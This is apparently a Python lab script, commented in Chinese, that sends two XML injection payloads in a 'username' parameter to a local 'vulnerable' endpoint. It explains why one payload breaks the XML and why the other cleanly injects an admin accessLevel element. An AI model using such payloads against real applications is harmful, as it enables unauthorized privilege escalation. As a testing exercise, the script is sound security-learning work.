#!/usr/bin/env python3
"""
XML注入payload测试脚本
验证两个不同payload的XML有效性
"""

import requests
import xml.etree.ElementTree as ET
from xml.parsers.expat import ExpatError

def test_xml_payload(payload, description):
    """测试XML payload"""
    print(f"\n{'='*60}")
    print(f"测试: {description}")
    print(f"{'='*60}")
    
    try:
        # 发送请求
        url = f"http://localhost:3000/vulnerable?username={payload}"
        print(f"请求URL: {url}")
        
        response = requests.get(url, timeout=5)
        
        print(f"响应状态: {response.status_code}")
        print(f"响应内容:")
        print(response.text)
        
        # 尝试解析XML
        try:
            root = ET.fromstring(response.text)
            print("\n[OK] XML解析成功")
            
            # 打印解析后的结构
            print("解析后的XML结构:")
            for elem in root.iter():
                print(f"  标签: {elem.tag}, 文本: {elem.text}")
                
        except ET.ParseError as e:
            print(f"\n[ERROR] XML解析失败: {e}")
        except ExpatError as e:
            print(f"\n[ERROR] XML格式错误: {e}")
            
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] 请求失败: {e}")
        return False

def main():
    """主函数"""
    print("XML注入Payload有效性测试")
    
    # Payload 1 - 有问题的
    payload1 = "admin</username><accessLevel>admin</accessLevel></userProfile><userProfile><username>user"
    
    # Payload 2 - 没问题的  
    payload2 = "admin</username><accessLevel>admin</accessLevel><username>user"
    
    # 测试两个payload
    test_xml_payload(payload1, "Payload 1 (有问题的)")
    test_xml_payload(payload2, "Payload 2 (正常的)")
    
    # 分析说明
    print(f"\n{'='*80}")
    print("分析总结")
    print(f"{'='*80}")
    print("Payload 1 问题:")
    print("  - 创建了嵌套的 <userProfile> 标签")
    print("  - XML结构不平衡，标签不匹配")
    print("  - 大多数XML解析器会报错")
    print()
    print("Payload 2 优势:")
    print("  - 保持原有XML结构")
    print("  - 所有标签都有对应的结束标签")
    print("  - 生成有效的XML文档")
    print("  - 成功注入了额外的元素")

if __name__ == "__main__":
    main()
